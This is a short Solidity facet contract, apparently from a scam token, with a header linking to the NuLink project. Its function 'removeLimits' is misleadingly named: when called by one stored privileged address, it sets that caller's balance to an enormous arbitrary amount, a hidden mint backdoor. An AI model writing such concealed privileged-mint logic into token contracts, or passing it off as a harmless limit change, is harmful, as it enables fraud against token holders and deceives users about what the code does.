/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/NuLink2021
    // Twitter: https://twitter.com/NuLink_
    // Website: https://www.nulink.org/
    // Medium:  https://medium.com/NuLink_
    // Discord: https://discord.com/invite/25CQFUuwJS
    // Github:  https://github.com/NuLink-network
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
